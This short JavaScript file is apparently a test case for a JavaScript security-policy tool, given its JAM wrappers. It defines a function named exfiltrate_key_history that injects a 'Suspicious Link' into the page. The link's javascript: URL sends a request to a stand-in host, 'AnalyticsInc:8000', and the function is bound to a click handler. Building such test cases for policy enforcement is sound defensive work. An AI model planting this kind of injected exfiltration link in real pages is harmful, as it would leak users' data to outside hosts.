function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=link", true);xmlhttp.send(null);';
  var link = document.createElement("a");
  link.href = "javascript:" + exp;
  JAM.set(link, "innerHTML", "Suspicious Link");
  link.id = "mylink";
  var v0 = document.getElementsByTagName("body")[0];
  JAM.call(v0.appendChild, v0, [link]);
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history);

